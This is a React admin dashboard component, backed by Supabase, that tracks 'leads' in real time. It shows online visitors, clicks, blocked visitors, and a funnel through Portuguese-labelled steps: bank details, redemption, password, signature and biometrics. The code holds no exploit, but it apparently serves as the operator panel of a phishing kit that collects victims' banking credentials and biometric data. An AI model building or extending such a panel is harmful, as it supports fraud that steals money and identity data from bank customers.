import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { leadRepository, sessionRepository, configRepository } from "@/repositories";
import { Users, Wifi, CheckCircle, Clock, MousePointerClick, ShieldBan } from "lucide-react";

interface Stats {
  totalLeads: number;
  onlineNow: number;
  completed: number;
  inProgress: number;
  totalSessions: number;
  totalBlocked: number;
  byStep: Record<string, number>;
}

interface StatCard {
  label: string;
  value: number;
  icon: React.ElementType;
  iconClass: string;
  accentClass: string;
  pulse?: boolean;
}

const STEP_LABELS: Record<string, string> = {
  splash: "Splash",
  inicio: "Início",
  "dados-bancarios": "Dados Bancários",
  resgate: "Resgate",
  senha: "Senha",
  assinatura: "Assinatura",
  biometria: "Biometria",
  concluido: "Concluído",
};

export default function AdminDashboard() {
  const [stats, setStats] = useState<Stats>({
    totalLeads: 0,
    onlineNow: 0,
    completed: 0,
    inProgress: 0,
    totalSessions: 0,
    totalBlocked: 0,
    byStep: {},
  });

  const fetchStats = async () => {
    const [total, completed, blocked, sessions, byStep] = await Promise.all([
      leadRepository.countAll(),
      leadRepository.countByStatus("concluido"),
      configRepository.countAccessLogs(),
      sessionRepository.countStats(),
      leadRepository.getStepCounts(),
    ]);

    setStats({
      totalLeads: total,
      onlineNow: sessions.online,
      completed,
      inProgress: total - completed,
      totalSessions: sessions.total,
      totalBlocked: blocked,
      byStep,
    });
  };

  useEffect(() => {
    fetchStats();

    const channel = supabase
      .channel("admin-dashboard")
      .on("postgres_changes", { event: "*", schema: "public", table: "leads" }, fetchStats)
      .on("postgres_changes", { event: "*", schema: "public", table: "site_sessions" }, fetchStats)
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, []);

  const cards: StatCard[] = [
    { label: "Total de Leads", value: stats.totalLeads, icon: Users, iconClass: "text-primary", accentClass: "border-primary" },
    { label: "Online Agora", value: stats.onlineNow, icon: Wifi, iconClass: "text-secondary", accentClass: "border-secondary", pulse: true },
    { label: "Total de Cliques", value: stats.totalSessions, icon: MousePointerClick, iconClass: "text-blue-400", accentClass: "border-blue-400" },
    { label: "Bloqueados", value: stats.totalBlocked, icon: ShieldBan, iconClass: "text-destructive", accentClass: "border-destructive" },
    { label: "Concluídos", value: stats.completed, icon: CheckCircle, iconClass: "text-emerald-400", accentClass: "border-emerald-400" },
    { label: "Em Andamento", value: stats.inProgress, icon: Clock, iconClass: "text-orange-400", accentClass: "border-orange-400" },
  ];

  return (
    <div className="space-y-6">
      <h1 className="text-xl font-bold text-foreground font-mono tracking-tight">// Dashboard</h1>

      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
        {cards.map((c) => (
          <div
            key={c.label}
            className={`rounded-xl bg-card border border-border border-l-4 p-5 shadow-sm ${c.accentClass}`}
          >
            <div className="flex items-center justify-between mb-3">
              <span className="font-mono text-[10px] tracking-[0.15em] text-muted-foreground uppercase">
                {c.label}
              </span>
              {c.pulse ? (
                <span className="relative flex h-2 w-2">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-secondary opacity-75" />
                  <span className="relative inline-flex rounded-full h-2 w-2 bg-secondary" />
                </span>
              ) : (
                <c.icon className={`h-4 w-4 ${c.iconClass}`} />
              )}
            </div>
            <p className="text-3xl font-bold text-foreground font-mono tracking-tight">{c.value}</p>
          </div>
        ))}
      </div>

      <div className="rounded-xl bg-card border border-border p-5 shadow-sm">
        <div className="flex items-center gap-3 mb-5">
          <span className="font-mono text-[10px] tracking-[0.2em] text-muted-foreground uppercase">Funil por Etapa</span>
          <div className="flex-1 h-px bg-border" />
        </div>
        <div className="space-y-3">
          {Object.entries(STEP_LABELS).map(([key, label]) => {
            const count = stats.byStep[key] ?? 0;
            const pct = stats.totalLeads > 0 ? (count / stats.totalLeads) * 100 : 0;
            return (
              <div key={key} className="flex items-center gap-3">
                <span className="w-32 text-xs text-muted-foreground truncate font-mono">{label}</span>
                <div className="flex-1 h-5 bg-muted rounded overflow-hidden">
                  <div
                    className="h-full bg-primary/70 rounded transition-all duration-500"
                    style={{ width: `${pct}%` }}
                  />
                </div>
                <span className="w-8 text-right text-xs font-bold font-mono text-foreground">{count}</span>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}
